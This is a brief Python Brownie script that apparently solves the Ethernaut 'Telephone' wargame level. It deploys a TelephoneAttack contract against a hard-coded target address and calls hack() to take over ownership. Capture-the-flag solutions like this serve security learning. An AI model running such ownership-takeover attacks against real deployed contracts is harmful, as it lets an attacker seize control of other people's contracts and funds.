from scripts.helpful_scripts import get_account
from brownie import TelephoneAttack


def main():
    account = get_account()
    attack = TelephoneAttack.deploy(
        "0xf0923BF218451E8084F578ba21A8a8249427a5Ee", {"from": account}
    )

    attack.hack(account.address, {"from": account})
